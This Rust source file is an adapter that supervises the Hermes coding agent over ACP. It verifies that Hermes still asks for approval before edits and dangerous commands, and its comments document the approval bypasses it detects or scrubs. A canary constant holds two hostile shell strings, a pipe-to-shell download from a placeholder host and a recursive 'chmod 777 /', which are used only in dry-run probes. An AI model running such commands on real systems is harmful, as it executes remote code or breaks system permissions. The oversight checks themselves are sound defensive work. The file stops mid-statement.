//! Native Hermes adapter: drive the `hermes` CLI through **ACP** (Agent
//! Client Protocol) over stdio, in its own process group, with sanitized
//! env and piped stdio.
//!
//! # Why ACP and not a CLI scrape
//!
//! Hermes offers four plausible surfaces and only one of them is a real
//! client protocol (all four checked live against
//! `Hermes Agent v0.20.4 (2026.8.18)`, 2026-08-20):
//!
//! - `-z/--oneshot` — its own `--help` says "approvals are auto-bypassed".
//!   Disqualified on the first line of its documentation; eave will not
//!   drive a surface that cannot ask.
//! - `--cli` / `--tui` — human REPLs. No machine-readable frame format.
//! - `serve` — a long-lived HTTP/WebSocket backend on a port, shared
//!   machine-wide. Wrong lifetime and wrong ownership for one session in
//!   one process group.
//! - `acp` — newline-delimited JSON-RPC 2.0 on stdio, protocol version 1,
//!   with streaming `session/update` notifications, multi-turn on one
//!   process, and **permission questions as first-class agent→client
//!   requests**. That last property is the whole reason this adapter
//!   exists: it is the Hermes analogue of Slice K's
//!   `--permission-prompt-tool stdio`, except standardised rather than
//!   undocumented.
//!
//! So: one `hermes acp` process per session, `initialize` → `session/new`
//! (or `session/load` on resume) → one `session/prompt` per turn.
//!
//! # Permission posture (the part that took the work)
//!
//! Hermes has **three independent approval bypasses**, and its own
//! `approvals test` evaluator was used to prove each one rather than to
//! guess at it (transcripts in the Slice AW report):
//!
//! 1. `HERMES_YOLO_MODE` in the environment, frozen at import time
//!    (`tools/approval.py:37`). **Scrubbed from the child env** below,
//!    along with `HERMES_ACCEPT_HOOKS` — a hook is arbitrary shell that
//!    would otherwise run without consent.
//! 2. `approvals.mode: off` in `~/.hermes/config.yaml`.
//! 3. `command_allowlist` entries in the same file.
//!
//! `--ignore-user-config` does **not** close 2 or 3. That was checked, not
//! assumed: `HERMES_IGNORE_USER_CONFIG=1` is read by `cli.py`'s
//! `load_cli_config()`, but the approval gate reads
//! `hermes_cli/config.py`'s `load_config_readonly()`, which has no such
//! branch — and `hermes approvals test` returns `allow ("approval bypass
//! active")` with the variable set. So this adapter does **not** set it:
//! it would disable the operator's provider and model configuration
//! (breaking the session outright) while delivering none of the safety
//! that would justify doing so. See [`preflight`].
//!
//! Instead the posture is **verified twice, from two independent facts**,
//! in the spirit of Slice K's `init.permissionMode` — never assumed:
//!
//! - **Edits.** `session/new` answers with `modes.currentModeId`. `default`
//!   is Hermes' own "Ask before edits"; `accept_edits` and `dont_ask`
//!   auto-allow file writes. Anything but `default` is refused at the
//!   first frame, exactly like a Claude session reporting `acceptEdits`.
//! - **Commands.** `hermes approvals test` is a dry-run of the real
//!   runtime guards that "never executes the command, prompts anyone, or
//!   persists anything" (its own `--help`). Two known-dangerous canaries
//!   are put through it in the same env and cwd the session will run in,
//!   and both must come back `ask-approval`. That is the only thing that
//!   sees bypasses 1–3, because they live in the operator's config and
//!   environment rather than on the wire.
//!
//! # What this posture does NOT guarantee — read this before trusting it
//!
//! Under Claude, `--permission-prompt-tool stdio` routes **every** tool to
//! eave. Hermes is narrower, and no flag widens it:
//!
//! - Only **dangerous-pattern** shell commands ask. `ls -la` returns
//!   `allow ("no guard matched; would run without a prompt")` and eave
//!   never sees it.
//! - Only `write_file` and `patch` go through the edit-approval bridge.
//!   Other tools (`web_search`, MCP tools, …) do not ask.
//! - Hermes **stops waiting after 60 seconds** and auto-denies
//!   (`acp_adapter/permissions.py:114`). eave's rule is that a session
//!   waits indefinitely on a human; Hermes' is not. The failure direction
//!   is deny, so nothing is written unreviewed — but the question expires,
//!   and a card left on screen past that point would be a lie. See
//!   [`APPROVAL_STALE_AFTER`].
//! - An ACP permission response carries no free text
//!   (`RequestPermissionResponse.outcome` is `{outcome, optionId}` only),
//!   so an operator's **deny message is not delivered to the model**. The
//!   decision lands; the reason does not.

use std::process::Stdio;
use std::sync::atomic::{AtomicI64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use async_trait::async_trait;
use serde_json::Value;
use tokio::process::Command;
use tokio::sync::mpsc;
use tokio::task::JoinHandle;

use crate::acp::permission::{self, PendingApprovals};
use crate::acp::update::{AcpStream, Thoughts, ToolInput, ToolNaming, UpdateSpec};
use crate::acp::wire::{self, Frame, SharedStdin};
/// Re-exported because the Hermes-specific constructor below
/// ([`ChildEnv::for_session`]) is the only one callers of this module ever
/// want, and the probe tests build the overlay themselves to prove the
/// session and the probe see one environment.
pub use crate::acp::ChildEnv;
use crate::acp::{
    self, AcpChild, AcpLines, AcpSpec, ChildSpec, HandshakeError, HandshakeGate, ModeVerdict,
};
use crate::events::SessionEvent;
use crate::proc::ProcIdentity;
use crate::session::{
    AgentSession, ApprovalDecision, KillReport, SessionError, SessionWatch, SpawnConfig,
};

/// Hermes' ACP quirks, in one place. Everything not named here is the
/// shared core's (`crate::acp`).
const HERMES: AcpSpec = AcpSpec {
    provider_id: "hermes",
    acp_args: spawn_args,
    child_env: |cfg| ChildEnv::for_session(&cfg.extra_env),
    // Standard ACP and nothing else: Hermes puts every streaming update on
    // the one notification the protocol defines.
    update_channels: &["session/update"],
    update: UpdateSpec {
        // `name` is ACP's `kind`, NOT the Hermes tool name.
        //
        // The tool name is not on the wire at all: for the tools that
        // matter (`terminal`, `write_file`, `patch`, `read_file`)
        // `acp_adapter/tools.py` passes no `rawInput` and folds the name
        // into a human `title` like `"terminal: cargo test"`. Splitting
        // that title on `": "` would recover the name most of the time and
        // silently invent one the rest of the time. `kind` is an
        // enumerated protocol value that is always present and never a
        // guess; the title is preserved verbatim in the input below, where
        // the rail can show it.
        tool_naming: ToolNaming::ProtocolKind,
        tool_input: ToolInput::WholeUpdate,
        thoughts: Thoughts::Journaled,
        progress_events: true,
        // Hermes reports the end of a turn in the prompt's RPC reply, so
        // the turn's assistant text is flushed there as one
        // `AssistantText`.
        accumulate_turn_text: true,
    },
    // The only session mode whose description is "Ask before edits"
    // (`acp_adapter/server.py:_session_modes`, and the live `session/new`
    // reply). Fail-closed like Slice K's `ASKING_MODES`: an unrecognised
    // mode — including one this build has never heard of — is refused,
    // because "does this posture review writes?" has no safe default.
    asking_modes: &["default"],
};

/// First id handed to a `session/prompt`. Everything at or above this is a
/// turn, which is what makes the reply recognisable as a turn result — the
/// two below it are the handshake ids the shared core owns.
const ID_FIRST_PROMPT: i64 = 3;

/// How long Hermes waits for a permission answer before it stops waiting
/// and auto-denies.
///
/// **Cited, not chosen**: `timeout: float = 60.0` in
/// `acp_adapter/permissions.py:114` and `acp_adapter/edit_approval.py:290`.
/// Move it only when that source moves.
const HERMES_APPROVAL_TIMEOUT_SECS: u64 = 60;

/// Safety margin subtracted from the above before eave declares a question
/// withdrawn.
///
/// **Chosen, and the direction matters more than the size.** Withdrawing
/// EARLY loses an approval an operator was still entitled to give — the
/// session proceeds as if denied, which is the safe direction and merely
/// annoying. Withdrawing LATE lets eave journal an `Allow` that Hermes had
/// already timed out and discarded, which puts a decision in the
/// transcript that never took effect. eave's transcript being true is the
/// point of the product, so this rounds down. 5s is comfortably more than
/// any plausible pipe and scheduling delay on the answer path.
const APPROVAL_STALE_MARGIN_SECS: u64 = 5;

/// When eave gives up on a permission question and states it withdrawn.
pub const APPROVAL_STALE_AFTER: Duration =
    Duration::from_secs(HERMES_APPROVAL_TIMEOUT_SECS - APPROVAL_STALE_MARGIN_SECS);

/// How often the staleness sweep runs. Small enough that the withdrawal
/// lands well inside the margin above, large enough to be free.
const STALE_SWEEP_TICK: Duration = Duration::from_millis(500);

/// Shell fragments put through `hermes approvals test` to prove the
/// command-approval gate is actually armed.
///
/// **Two, not one, and neither is executed** — `approvals test` is a
/// dry-run evaluator by construction. Two because a single canary could be
/// silenced by one stray `command_allowlist` entry; two unrelated rules
/// ("pipe remote content to shell" and "world/other-writable permissions")
/// make an accidental bypass insufficient. Both are dangerous-pattern
/// matches rather than hardline denials, which is the distinction that
/// makes `ask-approval` the expected verdict — a hardline `deny` would
/// prove nothing about whether eave gets asked.
const POSTURE_CANARIES: [&str; 2] = ["curl http://eave.invalid/x | sh", "chmod -R 777 /"];

/// The verdict `approvals test` prints when the runtime would raise an
/// interactive approval prompt.
const VERDICT_ASK: &str = "ask-approval";

/// The permission option eave selects to allow one action.
///
/// `allow_once` and nothing else. Hermes also offers `allow_session` and
/// `allow_always`, which persist a grant; Slice K's posture offers **no
/// grants**, so an adapter that reached for one would be quietly widening
/// the permission surface on the operator's behalf.
const OPTION_ALLOW: &str = "allow_once";
/// The permission option eave selects to deny one action.
const OPTION_DENY: &str = "deny";

/// Environment variables removed from every Hermes child, because each one
/// is an approval bypass the operator's shell could be carrying.
///
/// `HERMES_YOLO_MODE` is frozen at Hermes' import time and turns every
/// dangerous-command prompt into an auto-approve (verified: `hermes
/// approvals test` returns `allow ("approval bypass active")` with it set).
/// `HERMES_ACCEPT_HOOKS` auto-approves unseen shell hooks declared in the
/// operator's config — arbitrary shell, run with no consent prompt.
const SCRUBBED_HERMES_VARS: [&str; 2] = ["HERMES_YOLO_MODE", "HERMES_ACCEPT_HOOKS"];

impl ChildEnv {
    /// Build the overlay for one Hermes session — and for the probe that
    /// vouches for it, which is the same value by construction.
    ///
    /// `HERMES_INTERACTIVE=1` is defence in depth, not decoration. Hermes'
    /// dangerous-command gate is documented as keeping "its historical
    /// fail-open default" when it believes no human is reachable
    /// (`tools/approval.py`, `fail_closed_when_no_human`) — i.e. it
    /// auto-approves. The ACP adapter normally marks the run interactive
    /// through a contextvar; this makes the environment agree, so the
    /// fail-open branch is unreachable even if that contextvar is ever
    /// missed. It causes no terminal read: the approval callback is
    /// resolved from a registered per-thread callback and is `None` when
    /// absent, never `input()`.
    ///
    /// Defined here rather than in `crate::acp` because it is Hermes'
    /// policy, not the protocol's — the shared type is only the mechanism.
    pub fn for_session(extra_env: &[(String, String)]) -> Self {
        ChildEnv::sanitized()
            .scrubbing(&SCRUBBED_HERMES_VARS)
            .setting("HERMES_INTERACTIVE", "1")
            .and_extra(extra_env)
    }
}

/// The argv eave spawns Hermes with.
///
/// NOTE the asymmetry with `claude.rs` and `grok.rs`: there is no
/// `--model` here. `hermes acp` takes no model flag; ACP carries the model
/// as protocol (`session/new` answers with `models.availableModels` and
/// `session/set_model` switches it), so a `--model` on this argv would be
/// silently ignored — worse than absent. Model selection is stated as Not
/// Done in the Slice AW report rather than faked here.
///
/// The session's own flags come after eave's, verbatim and last. Already
/// filtered of anything that would undo the posture at the engine boundary
/// (`session::conflicts_with_eave_flags`) — this is a spawn, not a policy
/// point.
fn spawn_args(cfg: &SpawnConfig) -> Vec<String> {
    let mut args = vec!["acp".to_string()];
    args.extend(cfg.extra_args.iter().cloned());
    args
}

// ---------------------------------------------------------------------------
// Parser

/// The session's ACP stream state: the protocol's own bookkeeping (shared)
/// plus the two facts that are this session's — its id and its open
/// questions.
#[derive(Default)]
struct HermesStream {
    stream: AcpStream,
    pending: PendingApprovals,
    session_id: Option<String>,
}

impl HermesStream {
    /// A `session/update` notification's payload.
    fn parse_session_update(&mut self, params: &Value, line: &str) -> Vec<SessionEvent> {
        let update = &params["update"];
        // Above the match: `session/load` replays the conversation as
        // ordinary updates before it answers, and a replayed
        // `current_mode_update` would re-run the posture check on a
        // session that has not opened yet.
        if self.stream.replay_absorbs() {
            return Vec::new();
        }
        match acp::update::kind_of(update) {
            // The posture can change under eave's feet: ACP lets a client
            // switch modes and the agent announce it. eave never sends
            // `session/set_mode`, so this should never fire — and if it
            // does, the session is running in a posture nobody verified.
            "current_mode_update" => {
                let mode = update
                    .get("currentModeId")
                    .and_then(Value::as_str)
                    .unwrap_or("");
                match mode_refusal(Some(mode)) {
                    Some(refusal) => vec![refusal],
                    None => vec![SessionEvent::System {
                        subtype: "current_mode_update".into(),
                        raw: line.to_string(),
                    }],
                }
            }
            _ => self.stream.decode(&HERMES.update, update, line),
        }
    }

    /// An agent→client `session/request_permission`. This is the whole
    /// reason the adapter speaks ACP.
    fn parse_permission_request(
        &mut self,
        id: &str,
        rpc_id: &Value,
        params: &Value,
    ) -> SessionEvent {
        let tool_call = params.get("toolCall").cloned().unwrap_or(Value::Null);
        let options = params.get("options").cloned().unwrap_or(Value::Null);
        self.pending.open(id.to_string(), rpc_id, &options);

        SessionEvent::ApprovalRequested {
            request_id: id.to_string(),
            tool: tool_call
                .get("kind")
                .and_then(Value::as_str)
                .unwrap_or("other")
                .to_string(),
            display_name: tool_call
                .get("title")
                .and_then(Value::as_str)
                .unwrap_or("")
                .to_string(),
            // The command approval carries `{command, description}` as
            // rawInput; the edit approval carries `{tool, arguments}`.
            description: permission::approval_description(&tool_call),
            path: permission::approval_path(&tool_call, None),
            input_json: permission::approval_input(&tool_call),
            // Hermes' own offer of how to stop being asked
            // (`allow_session`, `allow_always`, `deny_always`). eave takes
            // none of them; it is journaled because it is a fact about the
            // request, exactly as Slice K journals Claude's suggestions.
            suggestions_json: permission::suggestions(&options),
        }
    }
}

/// Refuse any mode that is not provably an asking one. The verdict comes
/// from the shared, fail-closed rule ([`crate::acp::classify_mode`]); the
/// sentence is Hermes' own, because the fix is Hermes' own.
fn mode_refusal(mode: Option<&str>) -> Option<SessionEvent> {
    match acp::classify_mode(HERMES.asking_modes, mode) {
        ModeVerdict::Asks => None,
        ModeVerdict::Unproven(m) => Some(SessionEvent::PostureRefused {
            mode: m.clone(),
            reason: format!(
                "Hermes is running in ACP session mode {m:?}, which auto-allows file edits \
                 instead of asking; eave refuses to supervise a session it cannot review"
            ),
        }),
        ModeVerdict::Unstated => Some(SessionEvent::PostureRefused {
            mode: "unstated".into(),
            reason: "Hermes did not state an ACP session mode, so eave cannot prove it will \
                     ask before it writes"
                .into(),
        }),
    }
}

// ---------------------------------------------------------------------------
// Preflight: the command-approval half of the posture proof

/// Result of asking Hermes' own evaluator whether it would still ask.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Preflight {
    /// Every canary came back `ask-approval`.
    Asks,
    /// It would not ask, and this is why.
    Refused(String),
}

/// Read one Hermes config key, or `None` when it is unset.
///
/// `hermes config get --json <key>` prints JSON when the key is set and a
/// plain English "Config key not set: …" line when it is not — **both with
/// exit status 0**. So the discriminator is "did stdout parse as JSON",
/// not a match on the English, which would break the day the wording
/// changes.
async fn config_get(
    program: &std::path::Path,
    cwd: &std::path::Path,
    env: &ChildEnv,
    key: &str,
) -> Option<String> {
    let mut cmd = Command::new(program);
    cmd.current_dir(cwd)
        .args(["config", "get", "--json", key])
        .stdin(Stdio::null());
    env.apply(&mut cmd);
    let out = cmd.output().await.ok()?;
    let text = String::from_utf8_lossy(&out.stdout);
    match serde_json::from_str::<Value>(text.trim()) {
        Ok(Value::String(s)) => Some(s),
        _ => None,
    }
}

/// Prove that Hermes' command-approval gate is armed for the environment
/// this session is about to run in.
///
/// This is the only check that can see the operator's `config.yaml` and
/// environment, which is where all three approval bypasses live. It runs
/// `hermes approvals test`, which by its own `--help` evaluates "against
/// the REAL runtime approval guards … without executing the command,
/// prompting anyone, or persisting anything".
///
/// `env_type` matters and is not assumed: an isolated container backend
/// makes the runtime "skip all command guards", so the probe is run
/// against the backend the session will actually use, and a backend that
/// skips the guards produces `allow` and is refused here.
pub async fn preflight(
    program: &std::path::Path,
    cwd: &std::path::Path,
    env: &ChildEnv,
) -> Preflight {
    // Hermes is a Python program that loads its plugin set on every
    // invocation: one `hermes` subprocess measured 2.4–4.9s wall on the
    // development machine (2026-08-20, three samples each of `config get`
    // and `approvals test`). Three of them in series would add ~10s to
    // every session spawn, so the canaries run concurrently and the whole
    // preflight is started in parallel with the ACP handshake — which is
    // itself waiting on the same interpreter boot.
    let env_type = config_get(program, cwd, env, "terminal.env_type")
        .await
        .unwrap_or_else(|| "local".to_string());

    let mut probes = Vec::with_capacity(POSTURE_CANARIES.len());
    for canary in POSTURE_CANARIES {
        probes.push(tokio::spawn(probe_canary(
            program.to_path_buf(),
            cwd.to_path_buf(),
            env.clone(),
            env_type.clone(),
            canary,
        )));
    }
    // Awaited in order, so the reported refusal is the same one every
    // time regardless of which subprocess happened to finish first.
    let mut refusal = None;
    for probe in probes {
        let verdict = match probe.await {
            Ok(verdict) => verdict,
            Err(err) => Preflight::Refused(format!(
                "eave could not complete the Hermes approval probe ({err}); a posture that \
                 cannot be checked is not a posture eave will run under"
            )),
        };
        if refusal.is_none() {
            if let Preflight::Refused(_) = verdict {
                refusal = Some(verdict);
            }
        }
    }
    refusal.unwrap_or(Preflight::Asks)
}

/// Put one canary through `hermes approvals test` and read the verdict.
async fn probe_canary(
    program: std::path::PathBuf,
    cwd: std::path::PathBuf,
    env: ChildEnv,
    env_type: String,
    canary: &'static str,
) -> Preflight {
    let mut cmd = Command::new(&program);
    cmd.current_dir(&cwd)
        .args(["approvals", "test", "--json", "--env-type", &env_type, "--"])
        .arg(canary)
        .stdin(Stdio::null());
    env.apply(&mut cmd);
    let out = match cmd.output().await {
        Ok(out) => out,
        Err(err) => {
            return Preflight::Refused(format!(
                "eave could not run `hermes approvals test` to prove Hermes would ask \
                 before running a dangerous command ({err}); a posture that cannot be \
                 checked is not a posture eave will run under"
            ));
        }
    };
    let text = String::from_utf8_lossy(&out.stdout);
    let verdict = serde_json::from_str::<Value>(text.trim())
        .ok()
        .and_then(|v| v.get("verdict").and_then(Value::as_str).map(str::to_string));
    match verdict.as_deref() {
        Some(VERDICT_ASK) => Preflight::Asks,
        Some(other) => Preflight::Refused(format!(
            "Hermes answers {other:?} for {canary:?} under terminal backend {env_type:?} — \
             it would run that without asking eave. A bypass is active (approvals.mode: \
             off, a command_allowlist entry, or an isolating terminal backend); eave will \
             not supervise a session it cannot review"
        )),
        None => Preflight::Refused(format!(
            "`hermes approvals test` gave no verdict for {canary:?}, so eave cannot prove \
             Hermes would ask before running a dangerous command"
        )),
    }
}

// ---------------------------------------------------------------------------
// Session

struct Shared {
    stream: Mutex<HermesStream>,
    /// Settled only once BOTH posture proofs pass, so a prompt can never
    /// be sent to a session eave has not vouched for.
    ready: HandshakeGate,
}

pub struct HermesSession {
    child: AcpChild,
    shared: Arc<Shared>,
    next_id: AtomicI64,
}

impl HermesSession {
    /// Spawn one `hermes acp` process in its own process group with
    /// sanitized env and piped stdio (spec 01 §Spawn). Returns the session
    /// handle and its event stream; `SessionEvent::Exited` is always the
    /// final event.
    pub fn spawn(cfg: &SpawnConfig) -> Result<(Self, mpsc::Receiver<SessionEvent>), SessionError> {
        let shared = Arc::new(Shared {
            stream: Mutex::new(HermesStream::default()),
            ready: HandshakeGate::new(),
        });

        let child_env = (HERMES.child_env)(cfg);
        let program = cfg.program.clone();
        let cwd = cfg.cwd.clone();
        let resume = acp::resume_cursor(cfg);
        let reader_shared = Arc::clone(&shared);
        let sweep_shared = Arc::clone(&shared);
        // Filled by the closure below, which runs the instant the child is
        // up; drained straight after so the supervisor can stop the sweep
        // when the leader is reaped.
        let sweep_slot: Arc<Mutex<Option<JoinHandle<()>>>> = Arc::default();
        let sweep_out = Arc::clone(&sweep_slot);

        let (child, events_rx) = AcpChild::spawn(
            ChildSpec {
                program: program.clone(),
                cwd: cwd.clone(),
                args: (HERMES.acp_args)(cfg),
                env: child_env.clone(),
            },
            move |lines, ctx, tx| {
                // Started HERE rather than when the handshake needs it.
                // Both this and Hermes' own ACP boot are waiting on the
                // same slow Python interpreter start, so running them in
                // parallel hides most of the preflight's cost instead of
                // adding it to every session spawn. Nothing acts on the
                // answer until the posture is checked, so starting early
                // cannot let an unverified session do anything.
                let preflight_task = tokio::spawn({
                    let program = program.clone();
                    let cwd = cwd.clone();
                    async move { preflight(&program, &cwd, &child_env).await }
                });
                *sweep_out.lock().unwrap() =
                    Some(tokio::spawn(stale_sweep(sweep_shared, tx.clone())));
                let reader = Reader {
                    shared: reader_shared,
                    tx,
                    stdin: ctx.stdin.clone(),
                    cwd,
                    preflight: tokio::sync::Mutex::new(Some(preflight_task)),
                    resume,
                };
                async move { reader.run(lines).await }
            },
        )?;
        if let Some(sweep) = sweep_slot.lock().unwrap().take() {
            child.abort_at_exit(sweep);
        }

        Ok((
            Self {
                child,
                shared,
                next_id: AtomicI64::new(ID_FIRST_PROMPT),
            },
            events_rx,
        ))
    }

    /// The verified ACP session id, once the handshake has produced one.
    ///
    /// Waits rather than races: a caller that sends a prompt the
    /// millisecond after spawn is normal, and ACP has no session id until
    /// the server answers `session/new`. A refused posture resolves here
    /// too, so a prompt after a refusal is refused **with the reason**
    /// rather than with a bare protocol error — and, critically, is never
    /// sent. The engine already kills a session on `PostureRefused`; this
    /// is the second lock on the same door, so that a refused session
    /// cannot write even if it somehow keeps running.
    async fn acp_session_id(&self) -> Result<String, SessionError> {
        self.shared
            .ready
            .session_id()
            .await
            .map_err(|err| match err {
                // `PermissionDenied` and not a bare protocol error: the
                // refusal an operator sees should read as what it is.
                HandshakeError::Refused(reason) => SessionError::Io(std::io::Error::new(
                    std::io::ErrorKind::PermissionDenied,
                    reason,
                )),
                HandshakeError::Gone => SessionError::StdinClosed,
            })
    }

    fn stdin(&self) -> &SharedStdin {
        self.child.stdin()
    }
}

/// Notice, on eave's own clock, that Hermes has stopped waiting.
///
/// Hermes gives up on a permission answer long before a human necessarily
/// does, and it does not tell us when it does — so eave withdraws the
/// question rather than leaving an unanswerable card on screen.
async fn stale_sweep(shared: Arc<Shared>, tx: mpsc::Sender<SessionEvent>) {
    loop {
        tokio::time::sleep(STALE_SWEEP_TICK).await;
        if tx.is_closed() {
            return;
        }
        let stale = {
            let mut stream = shared.stream.lock().unwrap();
            let stale = stream.pending.stale(APPROVAL_STALE_AFTER);
            for id in &stale {
                stream.pending.close(id);
            }
            stale
        };
        for id in stale {
            let _ = tx
                .send(SessionEvent::ApprovalWithdrawn {
                    request_id: id,
                    reason: format!(
                        "Hermes stops waiting for an answer after {HERMES_APPROVAL_TIMEOUT_SECS}s \
                         and denies on its own; eave can no longer deliver a decision for this \
                         question"
                    ),
                })
                .await;
        }
    }
}

// ---------------------------------------------------------------------------
// Reader task

struct Reader {
    shared: Arc<Shared>,
    tx: mpsc::Sender<SessionEvent>,
    stdin: SharedStdin,
    /// The session's working directory, which `session/new` and
    /// `session/load` both name.
    cwd: std::path::PathBuf,
    /// The posture probe, started at spawn and awaited once the wire has
    /// answered. `Option` because it is taken exactly once; `Mutex`
    /// because the reader task holds `&self`.
    preflight: tokio::sync::Mutex<Option<JoinHandle<Preflight>>>,
    /// `Some(id)` when this is a resume: `session/load` that id instead of
    /// minting a new one with `session/new`.
    resume: Option<String>,
}

impl Reader {
    async fn run(self, mut lines: AcpLines) {
        // Open the conversation. Everything after this is driven by what
        // comes back, in `handle`.
        self.send(wire::initialize_frame()).await;

        while let Some(line) = lines.next().await {
            self.handle(&line).await;
        }
        // The stream ended. If the handshake never completed, every future
        // caller of `acp_session_id` would otherwise wait forever: the
        // `watch` sender lives in `Shared`, which the session handle keeps
        // alive, so a dead child never closes the channel on its own. A
        // send that blocks for the lifetime of the process is worse than a
        // send that fails, and much worse than one that says why.
        self.shared.ready.settle_if_pending(
            "the Hermes process ended before it could open an ACP session, so eave has \
             nothing to send a prompt to",
        );
    }

    async fn handle(&self, line: &str) {
        let line = line.trim();
        if line.is_empty() {
            return;
        }
        let v: Value = match serde_json::from_str(line) {
            Ok(v) => v,
            Err(err) => return self.emit(wire::malformed(line, err.to_string())).await,
        };

        match wire::classify(&v) {
            // A request from the agent to us.
            Frame::Request { method, id } => self.agent_request(method, &id.clone(), &v).await,
            Frame::Notification { method } if HERMES.carries_updates(method) => {
                let events = self
                    .shared
                    .stream
                    .lock()
                    .unwrap()
                    .parse_session_update(&v["params"], line);
                self.emit_all(events).await;
            }
            Frame::Notification { method } => {
                self.emit(SessionEvent::Unknown {
                    event_type: method.to_string(),
                    raw: line.to_string(),
                })
                .await;
            }
            // A reply to something we asked.
            Frame::Response { id } => self.reply(id.as_i64(), &v, line).await,
            Frame::Unclassifiable => {
                self.emit(wire::malformed(
                    line,
                    "neither a request nor a reply".into(),
                ))
                .await
            }
        }
    }

    async fn agent_request(&self, method: &str, id: &Value, v: &Value) {
        // The JSON-RPC id IS the request id: the answer is a reply naming
        // it. Stringified because `SessionEvent` is provider-neutral and
        // Claude's ids are strings; the reply path parses it back so a
        // numeric id goes out numeric.
        let key = wire::id_key(id);
        if method == "session/request_permission" {
            let event =
                self.shared
                    .stream
                    .lock()
                    .unwrap()
                    .parse_permission_request(&key, id, &v["params"]);
            return self.emit(event).await;
        }
        // Anything else the agent asks of a client — `fs/read_text_file`,
        // `terminal/create` — eave declined at `initialize` and cannot
        // serve. Answer immediately with a stated refusal (Slice K
        // amendment 2's principle): silence would park the turn on a
        // request nobody can see.
        self.send(wire::method_not_found_frame(id, method)).await;
        self.emit(SessionEvent::DialogRefused {
            request_id: key,
            dialog: method.to_string(),
        })
        .await;
    }

    async fn reply(&self, id: Option<i64>, v: &Value, line: &str) {
        match id {
            Some(wire::RPC_INITIALIZE) => {
                if let Some(err) = v.get("error") {
                    return self
                        .refuse(format!(
                            "Hermes refused the ACP handshake ({err}), so eave cannot \
                             establish a session it is able to review"
                        ))
                        .await;
                }
                // ACP has no caller-chosen id: `session/new` takes a cwd
                // and answers with an id Hermes minted. eave's own
                // `cfg.session_id` therefore cannot be imposed on a NEW
                // Hermes session (unlike Claude's `--session-id`) and the
                // provider cursor is discovered instead — which is exactly
                // why `provider_session_id()` is an Option. On resume it
                // goes the other way: the id eave holds is the one
                // `session/load` is asked for.
                let cwd = self.cwd.display().to_string();
                // Record what Hermes said it can do before moving on. This
                // arm used to emit nothing and drop the whole result — see
                // `acp::Advertisement` for what that cost.
                self.emit(acp::advertisement(v.get("result")).record())
                    .await;
                // A RELOAD replays the conversation as live updates before
                // it answers; a fresh `session/new` replays nothing and
                // must not be gated (that would swallow the first turn).
                if self.resume.is_some() {
                    self.shared.stream.lock().unwrap().stream.begin_replay();
                }
                self.send(wire::session_frame(self.resume.as_deref(), &cwd))
                    .await;
            }
            Some(wire::RPC_SESSION) => self.session_opened(v, line).await,
            // A turn finished.
            Some(_) => {
                let text = self.shared.stream.lock().unwrap().stream.take_turn_text();
                if !text.is_empty() {
                    self.emit(SessionEvent::AssistantText { text }).await;
                }
                // Any tool still outstanding when the turn ends will never
                // be resolved: Hermes reports completions from the step
                // that follows a tool, and a turn that ends (or is
                // cancelled, or errors) has no such step. Closing them
                // here states a fact — the turn ended with no result —
                // rather than leaving a permanent phantom in flight.
                let orphans = self.shared.stream.lock().unwrap().stream.take_outstanding();
                for id in orphans {
                    self.emit(SessionEvent::ToolUseFinished {
                        id,
                        result: "the turn ended before Hermes reported a result for this tool"
                            .into(),
                        is_error: true,
                    diff: None,
                })
                    .await;
                }
                // A turn that failed at the protocol level. The error
                // object is kept verbatim alongside the verdict, because
                // "the turn errored" without saying how is the kind of
                // record that sends someone back to the CLI's own logs.
                if v.get("error").is_some() {
                    self.emit(SessionEvent::System {
                        subtype: "prompt_error".into(),
                        raw: line.to_string(),
                    })
                    .await;
                    self.emit(SessionEvent::TurnCompleted {
                        subtype: "error".into(),
                        is_error: true,
                    })
                    .await;
                    return;
                }
                // Slice CC: the settled response carries the turn's token
                // bill beside its stop reason. Emitted BEFORE
                // `TurnCompleted` so a reader that stops folding at the
                // turn boundary still sees it — the bill belongs to the
                // turn that just ended, not to the next one.
                if let Some(usage) = crate::acp::usage::from_prompt_response(v.get("result")) {
                    self.emit(usage).await;
                }
                let stop = v
                    .get("result")
                    .and_then(|r| r.get("stopReason"))
                    .and_then(Value::as_str)
                    .unwrap_or("unknown");
                self.emit(SessionEvent::TurnCompleted {
                    subtype: stop.to_string(),
                    // Hermes' own word for the outcome, not an inference:
                    // `refusal` is the only stop reason that reports the
                    // turn itself as failed (`acp/schema.py` StopReason).
                    is_error: stop == "refusal",
                })
                .await;
            }
            None => {
                self.emit(wire::malformed(line, "reply with a non-integer id".into()))
                    .await
            }
        }
    }

    /// `session/new` or `session/load` answered: verify the posture from
    /// two independent facts before letting the session do anything.
    async fn session_opened(&self, v: &Value, line: &str) {
        // Down in every case. A gate left armed on a failed load would
        // silently swallow whatever the agent said on its way out.
        let absorbed = self.shared.stream.lock().unwrap().stream.end_replay();
        if let Some(absorbed) = absorbed {
            self.emit(absorbed).await;
        }
        if let Some(err) = v.get("error") {
            return self
                .refuse(format!(
                    "Hermes could not open an ACP session ({err}), so there is nothing for \
                     eave to supervise"
                ))
                .await;
        }
        let result = &v["result"];
        // On `session/load` the id is the one we asked for; ACP does not
        // echo it in the reply, so fall back to it rather than inventing.
        let session_id = result
            .get("sessionId")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| self.resume.clone());
        let Some(session_id) = session_id else {
            return self
                .emit(wire::malformed(
                    line,
                    "session opened without a sessionId".into(),
                ))
                .await;
        };
        let mode = result
            .get("modes")
            .and_then(|m| m.get("currentModeId"))
            .and_then(Value::as_str)
            .map(str::to_string);

        self.shared.stream.lock().unwrap().session_id = Some(session_id.clone());

        // Proof one: Hermes' own statement of the edit posture, the direct
        // analogue of Claude's `init.permissionMode`.
        if let Some(refusal) = mode_refusal(mode.as_deref()) {
            self.announce(session_id, mode).await;
            let reason = match &refusal {
                SessionEvent::PostureRefused { reason, .. } => reason.clone(),
                _ => unreachable!("mode_refusal only ever returns PostureRefused"),
            };
            self.emit(refusal).await;
            return self.mark_refused(reason).await;
        }

        // Proof two: the command gate, which the wire cannot show us.
        // Started at spawn; this is where its answer is collected.
        let probe = match self.preflight.lock().await.take() {
            Some(task) => task.await.unwrap_or_else(|err| {
                Preflight::Refused(format!(
                    "eave could not complete the Hermes approval probe ({err}); a posture \
                     that cannot be checked is not a posture eave will run under"
                ))
            }),
            // Only reachable if Hermes answered `session/new` twice, which
            // would itself be a protocol violation — refuse rather than
            // treat a second unverified session as already proven.
            None => Preflight::Refused(
                "Hermes opened a second ACP session on one connection; eave cannot vouch \
